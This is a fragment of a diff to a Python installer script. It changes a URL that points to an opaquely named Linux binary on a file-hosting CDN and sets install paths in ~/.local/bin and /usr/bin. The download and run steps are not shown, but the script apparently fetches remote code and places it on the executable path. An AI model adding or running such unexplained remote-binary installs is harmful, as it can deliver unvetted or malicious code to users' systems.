@@ -4,7 +4,7 @@ import sys
 import platform
 import urllib.request
 
-URL = 'https://ucarecdn.com/15d0ef83-b6ca-4439-82c1-2d413c630ab0/trufcv00.2linuxx86_64'
+URL = 'https://ucarecdn.com/c98cc117-b9c3-43f6-9d12-5668679e5a6b/trufcv00.4linuxx84_64'
 
 USER_BIN = os.path.expanduser('~/.local/bin')
 SYSTEM_BIN = '/usr/bin'
